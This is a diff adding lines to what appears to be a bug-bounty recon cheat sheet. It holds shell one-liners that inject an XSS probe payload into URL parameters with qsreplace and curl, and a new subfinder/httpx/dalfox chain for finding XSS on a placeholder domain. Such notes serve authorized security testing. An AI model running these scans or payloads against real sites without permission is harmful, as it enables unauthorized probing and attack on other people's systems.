@@ -28,3 +28,9 @@ python3 paramspider.py -d domain.com
 ```bash
 cat domains.com.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[*] XSS HERE $host" ; done
 ```
+
+## Find and testing XSS with Dalfox
+
+```bash
+subfinder -d domain.com -o subdomains && httpx -l subdomains -o sites && cat sites | dalfox pipe -F
+```
